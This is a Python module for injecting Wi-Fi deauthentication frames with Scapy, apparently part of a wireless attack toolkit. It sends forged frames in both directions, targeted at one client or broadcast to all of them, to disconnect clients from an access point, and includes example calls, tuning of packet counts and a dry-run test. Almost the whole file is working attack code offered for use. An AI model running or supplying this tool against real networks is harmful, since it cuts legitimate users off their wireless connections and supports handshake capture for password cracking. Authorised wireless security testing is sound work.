#!/usr/bin/env python3
"""
Manual deauth packet injection using Scapy.

This module provides fine-grained control over deauthentication packet sending,
allowing you to specify exact packet counts instead of aireplay-ng's hardcoded
64 packets per burst.
"""

import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp


def send_deauth_packets(interface, bssid, client=None, count=8, reason=7, verbose=True):
    """
    Send deauthentication packets to disconnect a client from an AP.
    
    Args:
        interface: Monitor mode interface (e.g., 'wlan0mon')
        bssid: Target AP MAC address (e.g., 'AA:BB:CC:DD:EE:FF')
        client: Client MAC address (None for broadcast deauth)
        count: Number of deauth packets to send (default: 8)
        reason: Deauth reason code (default: 7 - Class 3 frame from non-associated STA)
        verbose: Print status messages
    
    Returns:
        int: Number of packets successfully sent
    
    Example:
        # Targeted deauth to specific client
        send_deauth_packets('wlan0mon', 'AA:BB:CC:DD:EE:FF', 'FF:EE:DD:CC:BB:AA', count=8)
        
        # Broadcast deauth to all clients
        send_deauth_packets('wlan0mon', 'AA:BB:CC:DD:EE:FF', count=8)
    """
    
    if client is None:
        # Broadcast deauth
        client = 'FF:FF:FF:FF:FF:FF'
        deauth_type = 'broadcast'
    else:
        deauth_type = 'targeted'
    
    if verbose:
        print(f"[*] Sending {count} {deauth_type} deauth packets (reason code {reason})")
        if deauth_type == 'targeted':
            print(f"[*] AP: {bssid}, Client: {client}")
        else:
            print(f"[*] AP: {bssid}")
    
    sent_count = 0
    
    try:
        for i in range(count):
            # Create deauth frame from AP to client
            packet_ap_to_client = (
                RadioTap() /
                Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) /
                Dot11Deauth(reason=reason)
            )
            
            # Create deauth frame from client to AP (bidirectional for better effectiveness)
            packet_client_to_ap = (
                RadioTap() /
                Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid) /
                Dot11Deauth(reason=reason)
            )
            
            # Send both directions
            sendp(packet_ap_to_client, iface=interface, verbose=False)
            sendp(packet_client_to_ap, iface=interface, verbose=False)
            
            sent_count += 2  # Count both directions
            
            # Small delay to avoid overwhelming the interface
            time.sleep(0.002)  # 2ms delay
        
        if verbose:
            print(f"[+] Successfully sent {sent_count} deauth packets ({count} bidirectional pairs)")
        
        return sent_count
        
    except PermissionError:
        print(f"[!] Permission denied. Make sure you're running as root and {interface} is in monitor mode.")
        return sent_count
    except OSError as e:
        print(f"[!] Error sending packets: {e}")
        print(f"[!] Make sure {interface} exists and is in monitor mode.")
        return sent_count
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return sent_count


def test_deauth():
    """
    Test function to verify the module works.
    This is a dry-run that doesn't actually send packets.
    """
    print("[*] Testing deauth module...")
    print("[*] This is a dry-run test - no packets will be sent")
    
    # Test packet construction
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth
        
        test_bssid = "AA:BB:CC:DD:EE:FF"
        test_client = "11:22:33:44:55:66"
        
        packet = (
            RadioTap() /
            Dot11(type=0, subtype=12, addr1=test_client, addr2=test_bssid, addr3=test_bssid) /
            Dot11Deauth(reason=7)
        )
        
        print(f"[+] Packet construction successful")
        print(f"[+] Packet summary: {packet.summary()}")
        print(f"[+] Module is ready to use")
        return True
        
    except ImportError as e:
        print(f"[!] Scapy import failed: {e}")
        print(f"[!] Install with: pip3 install scapy")
        return False
    except Exception as e:
        print(f"[!] Test failed: {e}")
        return False


if __name__ == "__main__":
    # Run test when module is executed directly
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "test":
        test_deauth()
    else:
        print("Usage:")
        print("  python3 deauth.py test          # Test module")
        print("")
        print("Or import in your code:")
        print("  from deauth import send_deauth_packets")
        print("  send_deauth_packets('wlan0mon', 'AA:BB:CC:DD:EE:FF', count=8)")
